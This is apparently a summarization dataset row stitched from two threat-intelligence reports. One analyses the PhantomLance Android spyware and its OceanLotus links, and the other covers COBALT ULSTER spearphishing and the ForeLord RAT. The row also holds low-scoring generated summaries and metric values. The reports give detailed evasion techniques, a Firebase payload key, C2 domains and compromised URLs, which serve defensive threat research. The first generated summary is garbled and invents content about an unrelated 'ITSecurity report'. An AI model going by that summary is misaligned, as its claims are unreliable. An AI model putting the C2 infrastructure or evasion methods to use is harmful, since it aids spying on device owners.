the research, we divided samples we found into a series of ""versions"" based on technical complexity: from the basic Version 1 to the highly sophisticated Version 3. Note that they do not fully correlate with the chronological order of their appearance ITW: for example, we observed Version 1 samples in late 2019 and in 2017, the year that we also saw Version 3.Functionality of all samples are similar - the main purpose of spyware was to gather sensitive information. While the basic functionality was not very broad, and included geolocation, call logs, contact access and SMS access, the application could also gather a list of installed applications, as well as device information, such as model and OS version. Furthermore, the threat actor was able to download and execute various malicious payloads, thus, adapting the payload that would be suitable to the specific device environment, such as Android version and installed apps. This way the actor is able to avoid overloading the application with unnecessary features and at the same time gather information needed.Version 1We attribute the latest Google Play sample (MD5: 2e06bbc26611305b28b40349a600f95c) to this version. This is a clear payload, and unlike the other versions, it does not drop an additional executable file. Our main theory about the reasons for all these versioning maneuvers is that the attackers are trying to use diverse techniques to achieve their key goal, to bypass the official Google marketplace filters. And achieve it they did, as even this version passed Google's filters and was uploaded to Google Play Store in 2019 (see Spreading for details).No suspicious permissions are mentioned in the manifest file, instead, they are requested dynamically and hidden inside the dex executable. This seems to be a further attempt at circumventing security filtering. In addition to that, there is a feature that we have not seen before: if the root privileges are accessible on the device, the malware can use a reflection call to the undocumented API function ""setUidMode"" to get permissions it needs without user involvement.Note that this trick only works with Android SDK version 19 or higher.Most of the aforementioned operations naturally require root access, but we believe that the root exploit may be delivered as payload in a server response to collected device info. Also, some of the applications that the malware mimics will have notified the user that they only work on rooted devices. For instance, Browser Cleaner can only clean up the browser cache if it is given root permissions.Version 2Specimens of this version were also detected in 2019 and earlier. One of the samples was located in Google Play Store in November 2019 and described in the Dr. Web blog. Based on our detection statistics and spotted version stamps, we believe that this version is a replacement for Version 3, which we did not observe in 2019.Below are the most valuable points and main differences from the Version 1.The malicious payload APK is now packed in an encrypted file in the assets directory and is decrypted by the first stage using an AES algorithm. A decryption key and initialization vector (IV) are located in the first 32 + 16 bytes of the encrypted payload.After decryption, the asset file will look like this.As you can see, before the APK magic, the file header contains strings that are used for making further reflection calls to payload methods. Here is the first-stage code fragment with explanations regarding the payload loading process.All Version 2 payloads use the same package name, ""com.android.play.games"", which probably mimics the official Google Play Games package, ""com.google.android.play.games"".Moreover, we spotted developer version stamps in decrypted payloads.MD5 Developer version stamp 65d399e6a77acf7e63ba771877f96f8e 5.10.6084 6bf9b834d841b13348851f2dc033773e 5.10.6090 8d5c64fdaae76bb74831c0543a7865c3 5.10.9018 3285ae59877c6241200f784b62531694 5.10.9018 e648a2cc826707aec33208408b882e31 5.10.9018It is worth mentioning payload manifests, which do not contain any permission requests. As stated in the description of Version 1, permissions required by the malicious features are granted via an undocumented Android API.We have found two different certificates used for signing Version 2 payloads.MD5 Certificate 6bf9b834d841b13348851f2dc033773e Serial Number: 0xa4ed88e620b8262e Issuer: CN=Lotvolron Validity: from = Wed Jan 20 11:30:49 MSK 2010 65d399e6a77acf7e63ba771877f96f8e 8d5c64fdaae76bb74831c0543a7865c3 Serial Number: 0xd47c08706d440384 Issuer: CN=Ventoplex Validity: from = Wed Apr 13 05:21:26 MSK 2011 3285ae59877c6241200f784b62531694 e648a2cc826707aec33208408b882e31Although validity dates look spoofed in both cases and do not point to any real deployment times, by analyzing all payload certificates, we discovered that the second one (Ventoplex) was used to sign Version 3 payloads as well.Version 2.1The latest samples of PhantomLance discovered in the early 2020 introduced a new technique for decrypting payloads: the malicious payload was shipped with its dropper, encrypted with AES. The key is not stored anywhere in the dropper itself but sent to the device using Google's Firebase remote config system. The other technical features are very similar to the ones we observed in Version 2, so we tagged this generation as Version 2.1.We were able to make a valid request to PhantomLance's Firebase API. The response consisted of a JSON struct containing the AES decryption key, where the ""code_disable"" value is the decryption key for payload.{ ""entries"": { ""code_disable"": ""27ypYitp1UFc9Tvh"" }, ""appName"": ""com.ozerlab.callrecorder"", ""state"": ""UPDATE"" } 1 2 3 4 5 6 7 { ""entries"" : { ""code_disable"" : ""27ypYitp1UFc9Tvh"" } , ""appName"" : ""com.ozerlab.callrecorder"" , ""state"" : ""UPDATE"" }What is important, the dropper expects that the AES decryption key will be stored in a parameter named ""code"", so this specific variant should not function properly. Besides, we noticed that Firebase previously returned one more field, named ""conf_disable"", which has the same value as the ""code_disable"", so we assume that the actors are still tinkering with this new feature.Another interesting technique that the actors are trying to implement is a third-stage payload implant. The second-stage payload (MD5: 83cd59e3ed1ba15f7a8cadfe9183e156) contains an APK file named ""data"" (MD5: 7048d56d923e049ca7f3d97fb5ba9812) with a corrupted header in the assets path.The second stage reads this APK file, decrypts it and rewrites its first 27 bytes as described below.This results in an APK file (MD5: c399d93146f3d12feb32da23b75304ba) that appears to be a typical PhantomLance payload configured with already known C2 servers (cloud.anofrio[.]com, video.viodger[.]com, api.anaehler[.]com). This third-stage APK is deployed with a custom native library named ""data.raw"", also stored at the assets path. This library is used for achieving persistence on the infected device and appears to be a custom daemonized ELF executable based on the open-source ""daemon.c"" Superuser tool component, while in previous samples, we saw MarsDaemon used for this purpose.Code comparison of the library used to daemonize the third stage payload with daemon.c source code hosted on GithubVersion 3While we have found that Version 2 has been used as a replacement for this one, as we have not observed any new deployments of Version 3 in 2019, it still looks more advanced in terms of technical details than Version 2. According to our detection statistics and deployment dates on application markets, Version 3 was active at least from 2016 to 2018.Below are the most valuable points and main differences between Version 3 and Version 2.The first-stage dropper appears even more obfuscated than that in Version 2, it uses a similar way of decrypting the payload, but it has minor differences. The encrypted content is split into multiple asset files under 10256 bytes in size plus an encrypted config file, and contains payload decryption details.Below is the payload decryption sequence.Decrypt the payload config file from the assets with both a hardcoded name and AES key. Read the following values from the decrypted payload config file in this order: AES key for APK payload decryptionClass and method names for reflection calls to the payloadMD5 for APK payload integrity checkNumber and names of the split APK payload parts Decrypt the APK payload header hardcoded in the first stage with the AES key from the payload config. Write it to the APK payload file. Using decrypted names of the split payload parts, decrypt their content and append them to the APK payload file one by one. Check the integrity of the resulting APK payload file by comparing with the MD5 value decrypted from the payload config. Load and run the APK payload.The following reversed code fragment represents the actual payload decryption process.Each Version 3 payload has the same package name, ""com.android.process.gpsp"", and is signed with the same certificate (CN=Ventoplex), used to sign some of the Version 2 payloads.The only developer version stamp that we have found in Version 3 payloads is ""10.2.98"".Another notable finding is the 243e2c6433815f2ecc204ada4821e7d6 sample, which we believe belongs to a Version 3 payload. However, no related dropper has been spotted in the wild, and unlike the other payloads, it is signed with a debug certificate and not obfuscated at all, revealing all variable/class/method names and even BuildConfig values. Our guess that this is a debug developer version that somehow got leaked.As a conclusion to this technical review, it is worth saying that all payloads across the different versions, even Version 1, which is in fact a clear payload without a dropper, share a code structure and locations where sensitive strings, such as ?2 addresses, are stored.SpreadThe main spreading vector used by the threat actors is distribution through application marketplaces. Apart from the com.zimice.browserturbo, which we have reported to Google, and com.physlane.opengl, reported by Dr. Web, we have observed tracks indicating that many malicious applications were deployed to Google Play in the past and have now been removed.These search results contain a link to already-removed malware in Google PlaySome of the applications whose appearance in Google Play we can confirm.Package name Google Play persistence date (at least) com.zimice.browserturbo 2019-11-06 com.physlane.opengl 2019-07-10 com.unianin.adsskipper 2018-12-26 com.codedexon.prayerbook 2018-08-20 com.luxury.BeerAddress 2018-08-20 com.luxury.BiFinBall 2018-08-20 com.zonjob.browsercleaner 2018-08-20 com.linevialab.ffont 2018-08-20Besides, we have identified multiple third-party marketplaces that, unlike Google Play, still host the malicious applications, such as https://apkcombo[.]com, https://apk[.]support/, https://apkpure[.]com, https://apkpourandroid[.]com and many others.Example of a malicious application with a description in Vietnamese that is still available in a third-party marketplace (hxxps://androidappsapk[.]co/detail-cham-soc-be-yeu-babycare/)In nearly every case of malware deployment, the threat actors try to build a fake developer profile by creating a Github account that contains only a fake end-user license agreement (EULA). An example is the one below, reported by us to Google.This Google Play page contains a fake developer emailHere is a related Github account with the same handle, registered on October 17, 2019.A Github profile that is part of the fake developer identityThe account contains only one report with one file described as some type of EULA.During our extensive investigation, we spotted a certain tactic often used by the threat actors for distributing their malware. The initial versions of applications uploaded to app marketplaces did not contain any malicious payloads or code for dropping a payload. These versions were accepted because they contained nothing suspicious, but follow-up versions were updated with both malicious payloads and code to drop and execute these payloads. We were able to confirm this behavior in all of the samples, and we were able to find two versions of the applications, with and without a payload.An example of this behavior can be seen in Ads Skipper (https://apkpure[.]ai/ads-skipper), in ApkPure.Versions of Ads Skipper with (v. 2.0) and without (v. 1.0) a malicious payload in ApkPureThird-party marketplaces like those mentioned in the table above often serve as a mirror for Google Play: they simply copy applications and metadata from Google Play to their own servers. Therefore, it is safe to assume that the samples listed in the table were copied from Google Play as well.InfrastructureWhile analyzing the ?2 server infrastructure, we quickly identified multiple domains that shared similarities with previous ones but were not linked to any known malware samples. This allowed us to uncover more pieces of the attackers' infrastructure.Example of related infrastructureTracking PhantomLance's old infrastructure, which dated back four years, we noticed that the expired domain names had been extended. The maintenance suggested that the infrastructure might be used again in the future.Domain Registered Last updated osloger[.]biz 2015-12-09 2019-12-01 log4jv[.]info 2015-12-09 2019-11-26 sqllitlever[.]info 2015-12-09 2019-11-26 anofrio[.]com 2017-05-16 2020-03-30 anaehler[.]com 2017-05-16 2020-03-30 viodger[.]com 2017-05-16 2020-04-07The PhantomLance TTPs indicate that samples are configured only with subdomains as C2 servers, while most, but not all, parent domains do not have their own IP resolution. We checked the ones that did have a valid resolution and found that they all resolved to the same IP address: 188.166.203[.]57. It belongs to the DigitalOcean cloud infrastructure provider and, according to Domaintools, hosts a total of 129 websites.Looking up records for this IP address in our passive DNS database suggests that a few dozen of these websites are legitimate, as well as the aforementioned PhantomLance domains and two more interesting overlaps with OceanLotus infrastructure:browsersyn[.]com: known domain used as a C2 in a previously publicly reported sample (MD5: b1990e19efaf88206f7bffe9df0d9419) considered by the industry to be the OceanLotus APT.cerisecaird[.]com: privately received information indicates that this domain is related to OceanLotus as well.VictimologyWe have observed around 300 infection attacks on Android devices in India, Vietnam, Bangladesh, Indonesia, etc. starting in 2016. Below is a rough cartographic representation of countries with top attempted attacks.We have also seen a number of detections in Nepal, Myanmar and Malaysia. As you can see, this part of South Asia seems to be targeted by the actors the most.Note that due to the chosen distribution vector (publication of malicious samples on publicly available application stores), there should be secondary infection of random victims not directly related to the actors' interests.To get more details on targeted victims, we looked at the types of applications that the malware mimicked. Apart from common luring applications, such as Flash plugins, cleaners and updaters, there were those that specifically targeted Vietnam.luxury.BeerAddress - ""Tim quan nhau | Tim quan nh?u"" (""Find each other | Find pubs"" in Vietnamese). An application for finding the nearest pub in Vietnam.- ""Tim quan nhau | Tim quan nh?u"" (""Find each other | Find pubs"" in Vietnamese). An application for finding the nearest pub in Vietnam. codedexon.churchaddress - ""??a ?i?m Nha Th?"" (""Church Place"")Publisher description (hxxps://apk.support/app-en/com.codedexon.churchaddress) translated from Vietnamese:Information about churches near you or the whole of Vietnam, information about patronies, priests, phone numbers, websites, email, activities, holidays...- ""??a ?i?m Nha Th?"" (""Church Place"") bulknewsexpress.news - ""Tin 247 - ??c Bao Hang Ngay"" (""Read Daily Newspaper"")Mimics the Vietnamese www.tin247.com mobile news application.Overlaps with previous campaignsIn this section, we provide a correlation of PhantomLance's activity with previously reported campaigns related to the OceanLotus APT.OceanLotus Android campaign in 2014-2017In May 2019, Antiy Labs published a report (https://www.antiy.net/p/analysis-of-the-attack-of-mobile-devices-by-oceanlotus/) in which they described an Android malware campaign, claiming that it was related to OceanLotus APT. We checked the provided indicators using information from our telemetry and found that the very first tracks of these samples date back to December 2014.It is important to note that according to our detection statistics, the majority of users affected by this campaign were located in Vietnam, with the exception of a small number of individuals located in China.The main infection vector seems to be links to malicious applications hosted on third-party websites, possibly distributed via SMS or email spearphishing attacks. Examples below.Referring URL for victim Malware URL First request Last request hxxp://download.com[.]vn/android/download/nhaccuatui-downloader/31798 hxxp://113.171.224.175/videoplayer/NhacCuaTuiDownloader[.]apk 2015-03-03 2015-03-22 hxxp://nhaccuatui.android.zyngacdn.com/NhacCuaTuiDownloader[.]apk 2014-12-29 2015-03-19 hxxp://www.mediafire.com/file/1elber8zl34tag4/framaroot-xpro[.]apk hxxp://download1825.mediafire.com/tyxddh46orzg/1elber8zl34tag4/framaroot-xpro[.]apk 2015-04-07 2017-01-04The latest registered malware download event occurred in December 2017. We observed a small amount of activity in 2018, but judging by the volume of hosted malware and the number of detections we observed, the main campaign took place from late 2014 to 2017.To best visualize the similarities we discovered, we made a code structure comparison of the sample from the old reported OceanLotus Android campaign (MD5: 0e7c2adda3bc65242a365ef72b91f3a8) and the only unobfuscated (probably a developer version) PhantomLance payload v3 (MD5: 243e2c6433815f2ecc204ada4821e7d6).Code structure comparison of a sample linked to OceanLotus and PhantomLance payload v3.Despite the multiple differences, we observed a similar pattern used in malware implementation. It seems that the developers have renamed ""module"" to ""plugin"", but the meaning remains the same. Overlapping classes look quite similar and have the same functionality. For example, here is a comparison of the methods contained in the Parser classes.Parser from 0e7c2adda3bc65242a365ef72b91f3a8 ParserWriter/Reader from 243e2c6433815f2ecc204ada4821e7d6 public void appendBoolean(boolean f) public void appendBoolean(boolean value) public void appendByte(byte data) public void appendByte(byte value) public void appendBytes(byte[] data) public void appendBytes(byte[] value) public void appendDouble(double val) public void appendDouble(double value) public void appendInt(int val) public void appendInt(int value) public void appendLong(long val) public void appendLong(long value) private void appendNumber(Object value) public void appendShort(short val) public void appendShort(short value) public void appendString(String str) public void appendString(String value) public byte[] getContents() public byte[] getContents() public void appendFloat(float val) public boolean getBoolean() public boolean getBoolean() public byte getByte() public byte getByte() public byte[] getBytes() public byte[] getBytes() public double getDouble() public double getDouble() public float getFloat() public int getInt() public int getInt() public long getLong() public long getLong() public short getShort() public short getShort() byte getSignal() public String getString() public String getString() getStringOfNumber()Using our malware attribution technology, we can see that the PhantomLance payloads are at least 20% similar to the ones from the old OceanLotus Android campaign.OceanLotus macOS backdoorsThere are multiple public reports of macOS backdoors linked by the industry to OceanLotus. We examined these in order to find possible overlaps, with the caveat that it was really difficult to compare malware implemented for two completely different platforms, since two different programming languages were obviously used for the implementation process. However, during the analysis of the macOS payload (MD5: 306d3ed0a7c899b5ef9d0e3c91f05193) dated early 2018, we were able to catch a few minor tracks of the code pattern used in the Android malware implementation described above. In particular, three out of seven main classes had the same names and similar functionality: ""Converter"", ""Packet"" and ""Parser"".Summary of overlapsAnother notable attribution token that applies to most of OceanLotus malware across platforms is usage of three redundant, different C2 servers by each sample, mostly subdomains. Below is an example of this from the samples examined above and OceanLotus Windows malware described in our private report.MD5 C2 servers Description 0d5c03da348dce513bf575545493f3e3 mine.remaariegarcia[.]com egg.stralisemariegar[.]com api.anaehler[.]com PhantomLance Android d1eb52ef6c2445c848157beaba54044f sadma.knrowz[.]com ckoen.dmkatti[.]com itpk.mostmkru[.]com OceanLotus Android campaign 2014-2017 306d3ed0a7c899b5ef9d0e3c91f05193 ssl.arkouthrie[.]com s3.hiahornber[.]com widget.shoreoa[.]com OceanLotus MacOS backdoor 51f9a7d4263b3a565dec7083ca00340f ps.andreagahuvrauvin[.]com paste.christienollmache[.]xyz att.illagedrivestralia[.]xyz OceanLotus Windows backdoorBased on the complete analysis of previous campaigns, with the actors' interests in victims located in Vietnam, infrastructure overlaps between PhantomLance and OceanLotus for Windows, multiple code similarities between an old Android campaign and MacOS backdoors, we attribute the set of the Android activity (campaign 2014-2017 and PhantomLance) to OceanLotus with medium confidence.Considering the timeline of the Android campaigns, we believe that the activity reported by Antiy Labs is a previous campaign that was conducted by OceanLotus until 2017, and PhantomLance is a successor, active since 2016.In summarizing the results of this research, we are able to assess the scope and evolution of the actors' Android set of activity, operating for almost six years.IOCKaspersky Lab products verdictsPhantomLanceHEUR:Backdoor.AndroidOS.PhantomLance.*HEUR:Trojan-Dropper.AndroidOS.Dnolder.*Android campaign linked to OceanLotus (2014-2017)HEUR:Trojan.AndroidOS.Agent.euHEUR:Trojan.AndroidOS.Agent.vgHEUR:Trojan-Downloader.AndroidOS.Agent.gvmacOS campaign linked to OceanLotusHEUR:Backdoor.OSX.OceanLotus.*MD5PhantomLance malware2e06bbc26611305b28b40349a600f95cb1990e19efaf88206f7bffe9df0d94197048d56d923e049ca7f3d97fb5ba9812e648a2cc826707aec33208408b882e313285ae59877c6241200f784b625316948d5c64fdaae76bb74831c0543a7865c36bf9b834d841b13348851f2dc033773e0d5c03da348dce513bf575545493f3e30e7c2adda3bc65242a365ef72b91f3a8a795f662d10040728e916e1fd7570c1dd23472f47833049034011cad68958b468b35b3956078fc28e5709c5439e4dcb0af44bb0dd464680395230ade0d6414cd65d399e6a77acf7e63ba771877f96f8e79f06cb9281177a51278b2a33090c867b107c35b4ca3e549bdf102de918749ba83cd59e3ed1ba15f7a8cadfe9183e156c399d93146f3d12feb32da23b75304ba83c423c36ecda310375e8a1f4348a35e94a3ca93f1500b5bd7fd020569e4658954777021c34b0aed226145fde8424991872a3dd2cd5e01633b57fa5b9ac4648d243e2c6433815f2ecc204ada4821e7d6PhantomLance payload-free versionsa330456d7ca25c88060dc158049f3298a097b8d49386c8aab0bb38bbfdf315b27285f44fa75c3c7a27bbb4870fc0cdcab4706f171cf98742413d642b6ae728dc8008bedaaebc1284b1b834c5fd9a7a710e7b59b601a1c7ecd6f2f54b5cd8416aAndroid campaign 2014-20170e7c2adda3bc65242a365ef72b91f3a850bfd62721b4f3813c2d20b59642f0225079cb166df41233a1017d5e0150c17a810ef71bb52ea5c3cfe58b8e003520dcc630ab7b51f0c0fa38a4a0f45c793e24ce5bae8714ddfca9eb3bb24ee60f042dd61c18e577cfc046a6252775da12294ffe15c0eacdbf5a46bc9b2af9c551f86a07e01c2fa020724887fc39e5c97eccee2e49775599942815ab84d9de13e338b3315f8e3da94920248676b095786e26ad641f0cc057e2ab43f5444c5547e80976Domains and IP addressesPhantomLancemine.remaariegarcia[.]comegg.stralisemariegar[.]comapi.anaehler[.]comcloud.anofrio[.]comvideo.viodger[.]comterm.ursulapaulet[.]cominc.graceneufville[.]comlog.osloger[.]bizfile.log4jv[.]infonews.sqllitlever[.]infous.jaxonsorensen[.]clubstaff.kristianfiedler[.]clubbit.catalinabonami[.]comhr.halettebiermann[.]comcyn.ettebiermahalet[.]comAndroid campaign 2014-2017mtk.baimind[.]comming.chujong[.]commokkha.goongnam[.]comckoen.dmkatti[.]comsadma.knrowz[.]comitpk.mostmkru[.]comaki.viperse[.]comgame2015[.]nettaiphanmemfacebookmoi[.]infonhaccuatui.android.zyngacdn[.]comquam.viperse[.]comjang.goongnam[.]com";"The latest example of spyware in Google Play disguised as a browser cleaner is a clear payload, and unlike the other versions, it does not drop an additional executable file. What is important, the dropper expects that the AES decryption key will be stored in a parameter named ""code"", so this specific variant should not function properly. Besides, we noticed that Firebase previously returned one more field, named ""conf_disable"", which has the same value as the ""code_disable"", so we assume that the actors are still tinkering with this new feature.Another interesting technique that the actors are trying to implement is a thirdstage payload implant. Yes, we can confirm that the malicious applications have been removed from Google Play. The ITSecurity report provides an overview of the current state of cybersecurity threats and vulnerabilities in the IT industry. The report discusses the latest trends in cybersecurity, such as ransomware, cryptocurrency mining, and phishing. The report also provides an indepth analysis of the current state of cybersecurity in the IT industry. The PhantomLance malware campaign is related to the OceanLotus APT. Thank you for your report. We will take a look and get back to you. ### Output:";en;{'r': 0.07766990291262135, 'p': 0.8, 'f': 0.14159291874070012};{'r': 0.03714859437751004, 'p': 0.6235955056179775, 'f': 0.0701200242072494};{'r': 0.07692307692307693, 'p': 0.7923076923076923, 'f': 0.1402314483526811}
https://www.secureworks.com/blog/business-as-usual-for-iranian-operations-despite-increased-tensions;Business as Usual For Iranian Operations Despite Increased Tensions;"Cyberespionage operations by governments with mature cyber capabilities persist regardless of geopolitical events. Espionage typically focuses on broader long-term strategic goals.Secureworks(r) Counter Threat Unit(tm) (CTU) researchers monitor Iranian cyber operations, including the potential for retaliation after a January 2, 2020 U.S. drone strike killed Islamic Revolutionary Guard Corps (IRGC) Quds Force General Qasem Soleimani. Although there was ballistic missile bombardment of U.S. military personnel in Iraq on January 8, no government-directed cyber retaliation has been observed as of this publication.Despite the lack of retaliatory activity, CTU(tm) researchers have observed the continuation of several espionage-focused campaigns. A series of spearphishing campaigns that occurred between mid-2019 and mid-January 2020 targeted governmental organizations in Turkey, Jordan, Iraq, as well as global intergovernmental organizations and unknown entities in Georgia and Azerbaijan. Most of this activity commenced prior to the U.S. drone strike. Victimology and code similarity between the macros in the analyzed samples and macros documented in open-source reporting suggest that these campaigns were conducted by the COBALT ULSTER threat group (also known as MuddyWater, Seedworm, TEMP.Zagros, and Static Kitten), which is tasked by the Iranian government.Multiple paths to compromiseIn one compromised environment, threat actors conducted multiple rounds of spearphishing with malicious attachments to gain initial access. Some of the email messages contained a link to a compromised website, passing the name of the target organization as a parameter in the URL. These links were likely intended to track when messages were viewed, a tactic known as a web bug.CTU researchers analyzed two different infection chains. One chain delivered a malicious document via a ZIP archive attached to a spearphishing message. The archive contained a Microsoft Excel Spreadsheet (XLS) file with a filename that was thematically aligned with the spearphishing lure.In historic COBALT ULSTER campaigns, the documents used a government agency, university, or intelligence organization-related theme with blurred content and a prompt to enable macros. In mid-2019, the threat actors adopted a more generic style. In this approach, recipients who open the attachment are presented with a seemingly innocuous document that requests they ""enable"" the content to view the document (see Figure 1). This action disables security controls on active content in the document and runs the embedded malicious code.Figure 1. View presented to spearphishing recipients who open the malicious Excel files. (Source: Secureworks)The embedded VBScript macro is concealed using multiple layers of obfuscation. It drops a copy of the legitimate Microsoft 32-bit wscript.exe binary (MD5: d1ab72db2bedd2f255d35da3da0d4b16) into a non-standard directory path (see Figure 2) and uses it to run additional VBScript code. This binary typically runs from a location such as C:\Windows\SysWOW64\wscript.exe. The identification of this hash, or command lines that include /E:vbs, running from non-standard directories could indicate a compromise from this campaign.Figure 2. Examples of unusual locations where wscript.exe binary is dropped. (Source: Secureworks)An HKU\<Security Identifier>\Software\Microsoft\Windows\CurrentVersion\Run\ registry key is set for persistence. Another executed block of VBScript and PowerShell (e.g., the jjcpquui file shown in Figure 2) downloads a second-stage obfuscated PowerShell downloader (see Figure 3).Figure 3. Truncated extract of obfuscated PowerShell downloader using custom encoding scheme. (Source: Secureworks)This code downloads additional payloads from an IP address hard-coded in the script (see Figure 4). CTU researchers have observed four different IP addresses. Although many threat groups use multiple layers of obfuscation and multiple stages of activity to deploy payloads, these practices are common in COBALT ULSTER operations.Figure 4. Deobfuscated version of the obfuscated PowerShell downloader. (Source: Secureworks)The second infection chain analyzed by CTU researchers also used a spearphishing email to deliver a ZIP archive containing a malicious Excel file. In this case, the Excel file uses an obfuscated macro to drop and execute a previously unobserved remote access trojan (RAT) that CTU researchers refer to as ForeLord. The malicious document uses cmd.exe to execute a batch script (tt.bat) that adds a key to the registry for persistence when the system restarts. In parallel, a PowerShell script uses rundll32.exe to execute the ForeLord malware (Exchange.dll) (see Figure 5).Figure 5. Process tree showing the malicious Excel file creating the ForeLord persistence mechanism. (Source: Secureworks)The DNS-based command and control (C2) protocol uses DNS_TYPE_TEXT records to transfer data. The ForeLord name reflects one of the DNS responses that the malware looks for as part of the C2 protocol: ""lordlordlordlord"". This string is received from the C2 servers and acknowledges reception of the message. The ForeLord malware uses DNS request formats that correspond to one of the patterns shown in Figure 6.Figure 6. Format of ForeLord DNS requests. (Source: Secureworks)The use of DNS tunneling means the requests are initially directed to legitimate DNS servers, which relay the requests to malicious nameservers controlled by the threat actors. Pivoting on elements of the C2 protocol, CTU researchers identified 14 additional domains possibly registered by COBALT ULSTER.Figure 7 provides an overview of the interplay of the two infection chains analyzed by CTU researchers. A variety of additional tools were deployed to compromised systems after the final stage, and telemetry indicates interactive access from the threat actors.Figure 7. Overview of the two infection chains observed in January 2020 campaigns. (Source: Secureworks)After gaining initial access to a host, the threat actors dropped several tools to collect credentials, test those credentials on the network, and create a reverse SSL tunnel to provide an additional access channel to the network. These tools included PASS32.dll, PASS64.dll (see Figure 8), PasswordDumper.exe, and a Mimikatz variant named Caller.dll. The Caller.dll command line included Base64-encoded arguments, potentially as an evasion technique to hide the nature of this tool.Figure 8. Example command line used to run PASS64.dll. (Source: Secureworks)CredNinja.ps1 (see Figure 9) is an open-source tool that allows penetration testers to quickly test collected credentials or hashes to determine which will work on a targeted Windows domain. The threat actors used a list of valid user accounts from the target domain in conjunction with a weak password list to determine potentially accessible accounts. The password list could be augmented to test credentials captured from credential-dumping tools.Figure 9. CredNinja ASCII splash screen showing available options. (Source: GitHub)The open-source Secure Socket Funneling TCP and UDP port forwarding tool forwards data from multiple sockets through a single secure TLS tunnel to a remote computer. This forwarding provides the threat actor with an additional remote access mechanism. The -F option runs a SOCKS proxy on the local host, which is accessible from the server, and -p defines the remote port to use when connecting to the server (see Figure 10). It is possible that this mechanism was used to allow remote access to the compromised host via Remote Desktop Protocol (RDP).Figure 10. Command line used to run ssf.exe. (Source: Secureworks)ConclusionAlthough Iran has not launched a cyber retaliation for Soleimani's death as of this publication, CTU researchers acknowledge that planning and coordinating for a response takes time. Iran has destructive and disruptive capabilities that it has historically employed for retaliatory purposes against organizations. In some cases, these responses materialized several months after provocations toward Iran occurred. However, Iran's cyberespionage operations continue.From a threat management and risk assessment perspective, CTU researchers advise organizations not to conflate ongoing espionage operations with a retaliatory response. However, continually leveraging threat intelligence to assess and improve controls will help network defenders secure their environments against malicious activity regardless of intent.Many Iranian intrusions observed by CTU researchers between 2018 and early 2020 began with the collection of valid credentials in the victim's environment via social engineering, phishing, password spraying, brute-force attacks, and exploitation of publicly available systems. Organizations concerned about threats from Iran should review prevention, detection, and response procedures:Apply security updates to all systems, particularly those that are Internet-facing.Protect user credentials within the environment through periodic user awareness training and multi-factor authentication (MFA). Employ MFA for remote access solutions and web-based email access, including Office365.As most of the observed Iranian intrusions involved malware or abuse of native system tools, employ endpoint detection technology that detects those types of activity.Establish and test procedures for responding to denial of service activity. If appropriate, a distributed denial of service mitigation service provider can ensure continuity of Internet-facing services.To mitigate exposure to this malware, CTU researchers recommend that organizations use available controls to review and restrict access using the indicators listed in Table 1. The domains and URLs may contain malicious content, so consider the risks before opening them in a browser.Indicator Type Context lalindustries.com Domain name Compromised website hosting COBALT ULSTER C2 infrastructure linkupdate.org Domain name Compromised website hosting COBALT ULSTER C2 infrastructure cfm.com.pk Domain name Compromised website hosting COBALT ULSTER C2 infrastructure graphixo.net Domain name Compromised website hosting COBALT ULSTER C2 infrastructure ksahosting.net Domain name Compromised website hosting COBALT ULSTER C2 infrastructure assignmenthelptoday.com Domain name Compromised website hosting COBALT ULSTER C2 infrastructure ampacindustries.com Domain name Compromised website hosting COBALT ULSTER C2 infrastructure http://lalindustries.com/wp-content/upgrade/editor.php?ac=1&n= URL Compromised website hosting COBALT ULSTER C2 infrastructure http://linkupdate.org/js/js.php?ac=1&n= URL Compromised website hosting COBALT ULSTER C2 infrastructure http://cfm.com.pk/wp-includes/utf8.php?ac=1&n= URL Compromised website hosting COBALT ULSTER C2 infrastructure http://advanceorthocenter.com/wp-includes/editor.php?ac=1&n= URL Compromised website hosting COBALT ULSTER C2 infrastructure http://graphixo.net/wp-includes/utf8.php?ac=1&n= URL Compromised website hosting COBALT ULSTER C2 infrastructure http://ksahosting.net/wp-includes/utf8.php URL Compromised website hosting COBALT ULSTER C2 infrastructure https://assignmenthelptoday.com/wp-includes/utf8.php URL Compromised website hosting COBALT ULSTER C2 infrastructure outlook-accounts.tk Domain name Suspected ForeLord C2 infrastructure linked via bing-search.ml outlook-accounts.ml Domain name Suspected ForeLord C2 infrastructure linked via bing-search.ml officex64.ml Domain name Suspected ForeLord C2 infrastructure linked via bing-search.ml windows-patch.tk Domain name Suspected ForeLord C2 infrastructure linked via bing-search.ml windows-patch.ml Domain name Suspected ForeLord C2 infrastructure linked via bing-search.ml windowscortana.tk Domain name Suspected ForeLord C2 infrastructure linked via bing-search.ml msdn-social.tk Domain name Suspected ForeLord C2 infrastructure linked via bing-search.ml msdn-social.ml Domain name Suspected ForeLord C2 infrastructure linked via bing-search.ml spacex.gq Domain name Suspected ForeLord C2 infrastructure linked via bing-search.ml spacex.cf Domain name Suspected ForeLord C2 infrastructure linked via bing-search.ml googlecloud.gq Domain name Suspected ForeLord C2 infrastructure linked via bing-search.ml googlecloud.cf Domain name Suspected ForeLord C2 infrastructure linked via bing-search.ml device-update.tk Domain name Suspected ForeLord C2 infrastructure linked via bing-search.ml bing-search.ml Domain name Suspected ForeLord C2 infrastructure linked via bing-search.mlTable 1. Indicators for this threat.";"Cyberespionage operations by governments with mature cyber capabilities persist regardless of geopolitical events. Espionage typically focuses on broader longterm strategic goals.Secureworks(r) Counter Threat Unit(tm) (CTU) researchers monitor Iranian cyber operations, including the potential for retaliation after a January 2, 2020 U.S. drone strike killed Islamic Revolutionary Guard Corps (IRGC) Quds Force General Qasem Soleimani. Although there was ballistic missile bombardment of U.S. military personnel in Iraq on January 8, no governmentdirected cyber retaliation has been observed as of this publication.Despite the lack of retaliatory activity, CTU(tm) researchers have observed the continuation of several espionagefocused campaigns. A series of spearphishing campaigns that occurred between mid2019 and midJanuary 2020 targeted governmental organizations in Turkey, Jordan, Iraq, as well as global intergovernmental organizations and unknown entities in Georgia and Azerbaijan. Most of this activity commenced prior to the U.S. drone strike. Victimology and code similarity between the macros in the analyzed samples and macros documented in opensource reporting suggest that these campaigns were conducted by the COBALT ULSTER threat group (also known as MuddyWater, Seedworm, TEMP.Zagros, and Static Kitten), which is tasked by the Iranian government.Multiple paths to compromiseIn one compromised environment, threat actors conducted multiple rounds of spearphishing with malicious attachments to gain initial access. Some of the email messages contained a link to a This binary typically runs from a location such as C:\Windows\SysWOW64\wscript.exe. The identification of this hash, or command lines that include /E:vbs, running from nonstandard directories could indicate a compromise from this campaign. An HKU\<Security Identifier>\Software\Microsoft\Windows\CurrentVersion\Run\ registry key is set for persistence. Another executed block of 